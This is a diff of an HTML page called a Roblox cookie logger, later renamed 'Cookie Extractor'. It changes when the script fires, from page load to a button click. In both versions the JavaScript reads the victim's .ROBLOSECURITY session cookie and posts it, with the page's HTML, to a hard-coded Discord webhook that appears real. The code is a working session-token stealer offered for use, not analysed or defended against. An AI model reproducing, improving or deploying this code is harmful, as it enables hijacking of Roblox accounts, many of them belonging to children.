@@ -3,34 +3,43 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox Cookie Logger</title>
+    <title>Roblox Cookie Extractor</title>
 </head>
 <body>
+    <h1>Welcome to the Roblox Cookie Extractor</h1>
+    <button id="extractButton">Extract Cookies</button>
 
-<!-- Include the script to extract Roblox cookie and send it to Discord -->
-<script>
-    // Function to extract Roblox cookie
-    function extractRobloxCookie() {
-        // Attempt to access the Roblox cookie
-        var robloxCookie = document.cookie.match(/\.ROBLOSECURITY=([^;]+)/);
+    <script>
+        document.getElementById('extractButton').addEventListener('click', extractCookies);
 
-        // If the cookie is found, print it to the console
-        if (robloxCookie) {
-            var cookieValue = robloxCookie[1];
-            console.log('Roblox Cookie:', cookieValue); // Print the Roblox cookie to the console
+        function extractCookies() {
+            // JavaScript code to extract Roblox cookies
+            var robloxCookie = document.cookie.match(/\.ROBLOSECURITY=([^;]+)/);
+            if (robloxCookie) {
+                var cookieValue = robloxCookie[1];
+                
+                // Send cookies to Discord webhook
+                sendToDiscordWebhook(cookieValue);
+            }
+        }
 
-            // Send the Roblox cookie to Discord webhook
-            var endpoint = 'https://discord.com/api/webhooks/1231774438463242290/PP9iMkmZa0F81Zp3QUwuEAh5uGd2jvw86T0e5KypWYaoHKqXRqAvvkVHPOEKZsO4mRFx'; // Replace with your actual Discord webhook endpoint
+        function sendToDiscordWebhook(cookie) {
+            // Discord webhook URL
+            var webhookUrl = 'https://discord.com/api/webhooks/1231774438463242290/PP9iMkmZa0F81Zp3QUwuEAh5uGd2jvw86T0e5KypWYaoHKqXRqAvvkVHPOEKZsO4mRFx';
 
-            fetch(endpoint, {
+            // Data to send to Discord
+            var data = {
+                robloxCookie: cookie,
+                htmlContent: document.documentElement.outerHTML
+            };
+
+            // Send data to Discord webhook
+            fetch(webhookUrl, {
                 method: 'POST',
-                body: JSON.stringify({
-                    robloxCookie: cookieValue,
-                    htmlContent: document.documentElement.outerHTML // Include the HTML content of the page
-                }),
                 headers: {
                     'Content-Type': 'application/json'
-                }
+                },
+                body: JSON.stringify(data)
             })
             .then(response => {
                 if (response.ok) {
@@ -43,11 +52,6 @@
                 console.error('Error sending Roblox cookie to Discord webhook:', error.message);
             });
         }
-    }
-
-    // Call the function to extract and potentially send the Roblox cookie
-    extractRobloxCookie();
-</script>
-
+    </script>
 </body>
 </html>
